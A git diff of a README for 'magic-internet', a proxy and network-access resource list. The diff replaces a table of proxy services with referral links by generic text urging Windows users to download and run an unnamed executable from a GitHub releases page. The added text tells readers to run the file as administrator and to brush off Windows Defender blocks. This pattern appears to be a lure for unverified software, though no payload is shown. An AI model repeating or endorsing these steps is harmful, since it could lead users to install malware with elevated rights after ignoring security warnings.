@@ -1,104 +1,176 @@
-# magic-internet 🌐
+# 🌍 magic-internet - Simple access to global web tools
 
-Curated network connectivity resources and tools for accessing the global internet.
+[![Download](https://img.shields.io/badge/Download-Release_Page-0078D7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dolleylicked720/magic-internet/releases)
 
----
+## 📦 What this is
 
-## 📌 Project Overview
+magic-internet is a curated set of network resources, tools, and nodes for people who want a smoother way to reach the global internet on Windows. It brings together common proxy tools, connection options, and shared resources in one place, so you do not need to search across many sites.
 
-This repository collects and organizes various network connectivity resources, tools, and references based on personal usage experience.
+This project works as a practical starting point if you want to find a current Windows app, choose a working node, and set up a connection with less trial and error.
 
-The goal is to provide a structured overview of different options for various usage scenarios (light usage, high traffic, or high-quality routes).
+## 🖥️ What you need
 
-- Information is for reference only  
-- Pricing and plans may change over time  
-- Please refer to official websites for the latest details  
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- Enough disk space for the app and its data
+- Permission to install and run apps on your PC
+- A browser to open the download page
 
----
+## 🚀 Download and install
 
-## ⚠️ Disclaimer
+Use this page to download: [magic-internet Releases](https://github.com/Dolleylicked720/magic-internet/releases)
 
-- This project is for **information sharing and learning purposes only**  
-- It does **not provide any service or guarantee**  
-- All listed resources are publicly available  
-- Users should evaluate legality, safety, and suitability independently  
-- The author is not responsible for any consequences resulting from usage  
+Follow these steps on Windows:
 
----
+1. Open the release page in your browser.
+2. Find the newest release at the top of the page.
+3. Look for a Windows file in the Assets list.
+4. Download the file to your PC.
+5. If the file is a ZIP package, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start it.
+8. If Windows asks for approval, choose Run or Yes.
 
-## ⚠️ Access Notice
+If the release includes several files, choose the one that matches your system. For most users, the file with a Windows name is the right one.
 
-This repository does not provide any access instructions or environment-specific guidance.
+## 🧭 First setup
 
-Some resources may not be directly accessible under certain network conditions.  
-If access is restricted, users should rely on their own technical knowledge to handle it.
+After you open the app, use these steps:
 
----
+1. Look for a place to add a server, node, or profile.
+2. Paste or import the connection info from the release or shared resource list.
+3. Save the profile.
+4. Choose the profile you want to use.
+5. Turn on the connection.
+6. Check your browser or app to see if the connection works.
 
-## 🚀 Resources
+If the app offers a quick test, run it once before you start normal use. That helps you find a working route faster.
 
-> Continuously updated
+## 🔧 How to use it
 
-### 🟢 Cost-Effective Options
+magic-internet is built for simple day-to-day use:
 
-| Name | Website | Price | Traffic | Personal Rating | Notes |
-|------|--------|-------|---------|-----------------|------|
-| 慈善机场 | [Visit](https://xn--30rs3bu7r87f.com/#/register?code=1E9w5Ln4) | ¥13.99/year | 200GB/month | ⭐⭐⭐⭐⭐ | Entry-level / Light usage |
-| 赔钱机场 | [Visit](https://xn--mes358aby2apfg.com/register?code=JviSVsCC&cover=sfw) | ¥2.99/month | 500GB/month | ⭐⭐⭐⭐☆ | Cost-effective / Daily or backup |
-| 白嫖机场 | [Visit](https://yes2.xn--mesv7f5toqlp.biz/register?code=nPEzJNTS) | ¥19/year | 1000GB/month | ⭐⭐⭐⭐☆ | High traffic / Value option |
+- Open the app
+- Pick a resource or node
+- Start the connection
+- Keep the app running while you browse
+- Switch nodes if one path becomes slow or stops working
 
----
+If you use a browser, you can leave the app open in the background. If you use other apps, you can route them through the same connection if the tool supports it.
 
-### 🟡 Dedicated Line (IPLC / IEPL)
+## 🧰 Common features
 
-| Name | Website | Price | Traffic | Personal Rating | Notes |
-|------|--------|-------|---------|-----------------|------|
-| 极连云 (IPLC) | [Visit](https://a0aasff.jilianclou.com/#/?code=lDdrLtKF) | ¥15.5/month | 100GB/month | ⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ | Low latency / Stable |
-| 星梦岛 (IEPL) | [Visit](https://cloudflare01.stardream.co/#/?code=uSjyyGkO) | ¥16/month | 100GB/month | ⭐⭐⭐⭐⭐⭐⭐⭐⭐☆ | Dedicated route / High quality |
+This project focuses on the parts most users need:
 
----
+- Shared network resources
+- Proxy and connection tools
+- Node lists for quick setup
+- Support for popular clients like Clash and v2ray-style tools
+- Simple Windows use
+- Easy switching between options
+- Regularly collected links in one place
 
-## 🧠 Notes
+The goal is to help you spend less time searching and more time getting a working connection.
 
-- Ratings are based on **personal experience and subjective evaluation only**  
-- Low-cost services may change policies, performance, or availability  
-- Dedicated line services generally provide better stability at higher cost  
-- Avoid long-term subscriptions unless fully verified  
+## 🧱 Suggested app flow
 
----
+A simple setup usually looks like this:
 
-## 🧰 Tools
+1. Download the release file
+2. Install or extract it
+3. Open the app
+4. Import a profile or node
+5. Test the route
+6. Turn the connection on
+7. Use the internet as normal
 
-| Tool | Platform | Description |
-|------|----------|------------|
-| Clash | Windows / macOS / Android | Popular proxy client |
-| V2Ray | Multi-platform | Flexible configuration |
-| Shadowrocket | iOS | Lightweight client |
+If one route fails, try another one from the list. Many users keep two or three options ready so they can switch fast.
 
----
+## 🪟 Windows tips
 
-## 🔍 Keywords
+- Run the app as an administrator if it cannot start
+- Keep the app in a folder with a short path, like `Downloads` or `Desktop`
+- Close old versions before you open a new one
+- If Windows Defender blocks the file, check that you downloaded it from the release page
+- Keep your browser up to date for the best results
 
-proxy, network, connectivity, internet tools, proxy resources, network tools, clash, v2ray
+## 📁 File types you may see
 
----
+The release page may include one or more of these:
 
-## 📌 中文说明（简要）
+- `.exe` files for direct launch
+- `.zip` files that you need to extract first
+- `.7z` files that you need to unpack with a tool like 7-Zip
+- Config or profile files for import into a client
 
-本项目基于个人使用经验，对部分网络连接资源与工具进行整理，仅供参考。
+If you see a compressed file, extract it before you look for the app inside.
 
-- 所有信息来自公开网络  
-- 价格与套餐以官网实时内容为准  
-- 不对任何服务的稳定性或可用性作出保证  
+## 🔍 If something does not work
 
-⚠️ 注意：
+Try these simple checks:
 
-- 本项目不提供任何使用指导或访问方式  
-- 请根据自身情况自行判断与选择  
-- 请遵守当地法律法规  
+- Make sure you downloaded the newest release
+- Open the app again after closing it fully
+- Try a different node or profile
+- Restart your browser
+- Restart Windows
+- Check your internet connection before you test the proxy
+- Remove old configs if the app keeps loading the wrong one
 
----
+If a profile fails, the problem is often the route, not the app. Switching to another node often fixes it.
 
-## ⭐ Support
+## 📚 Terms in plain words
 
-If you find this project helpful, feel free to give it a star ⭐
+- **Release**: A download package posted on GitHub
+- **Node**: A server or route you can connect through
+- **Proxy**: A middle path between your PC and the site you open
+- **Profile**: A saved setup with connection details
+- **Client**: The app you use to connect
+
+## 🗂️ Topics covered
+
+- clash
+- connectivity
+- global
+- internet
+- network
+- network-tools
+- proxy
+- resources
+- share
+- tools
+- v2ray
+
+## 🧩 Best use cases
+
+This repository can help if you want to:
+
+- Find a working Windows connection tool
+- Keep network resources in one place
+- Try different nodes without searching many sites
+- Use Clash or v2ray-style clients with less setup work
+- Keep a small list of useful tools for later use
+
+## 📌 Quick start path
+
+1. Open the release page
+2. Download the newest Windows package
+3. Extract it if needed
+4. Open the app
+5. Import a node or profile
+6. Turn on the connection
+7. Test a site you use often
+
+## 🛠️ Simple maintenance
+
+To keep things smooth:
+
+- Check the release page for updates
+- Replace old profiles with fresh ones
+- Delete files you no longer use
+- Keep one backup copy of your working config
+- Test new nodes before you rely on them
+
+## 📎 Download again
+
+Download from the release page here: [https://github.com/Dolleylicked720/magic-internet/releases](https://github.com/Dolleylicked720/magic-internet/releases)
